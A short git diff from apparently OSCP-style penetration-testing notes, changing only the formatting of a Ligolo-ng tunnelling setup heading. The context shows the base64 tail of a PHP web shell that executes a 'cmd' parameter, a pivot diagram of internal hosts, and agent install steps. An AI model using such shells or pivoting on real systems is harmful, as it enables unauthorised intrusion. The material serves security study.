@@ -1050,7 +1050,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
         |               |
    DC01 (172.0.x.x)   MS02 (172.0.x.x)
   ```
-- Ligolo-ng setup and install
+- 🖥️ **Ligolo-ng setup and install**
   1. Install ligolo-ng to include ligolo-ng proxi file  
      `sudo apt install ligolo-ng`
   3. Download the agent files from the GitHub for the target machine (In OCSP is windows)  
